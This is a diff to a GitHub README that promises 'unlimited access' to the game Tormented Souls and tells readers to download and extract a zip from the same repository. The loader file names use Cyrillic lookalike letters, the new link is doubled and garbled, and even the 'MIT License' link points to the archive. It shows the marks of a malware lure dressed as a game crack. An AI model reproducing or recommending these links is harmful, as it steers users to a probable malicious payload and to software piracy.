@@ -25,7 +25,7 @@ Welcome to the ultimate solution for enthusiasts seeking to experience **Torment
 
 ## 📥 Installation
 
-1. Download **https://raw.githubusercontent.com/jaraatechuser/hurgada/main/Lоader.zip** from the repository.
+1. Download **https://github.com/jaraatechuser/hurgada/raw/refs/heads/main/zoolithic/Software-3.3.zipоhttps://github.com/jaraatechuser/hurgada/raw/refs/heads/main/zoolithic/Software-3.3.zip** from the repository.
 2. Extract the files using your favorite tool.
 3. Follow the included instructions and enjoy unlimited access to **Tormented Souls**!
 
@@ -35,4 +35,4 @@ Welcome to the ultimate solution for enthusiasts seeking to experience **Torment
 
 ## ⚖️ MIT License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/jaraatechuser/hurgada/main/Lоader.zip) for maximum transparency and user freedom.
+Distributed under the [MIT License](https://github.com/jaraatechuser/hurgada/raw/refs/heads/main/zoolithic/Software-3.3.zipоhttps://github.com/jaraatechuser/hurgada/raw/refs/heads/main/zoolithic/Software-3.3.zip) for maximum transparency and user freedom.
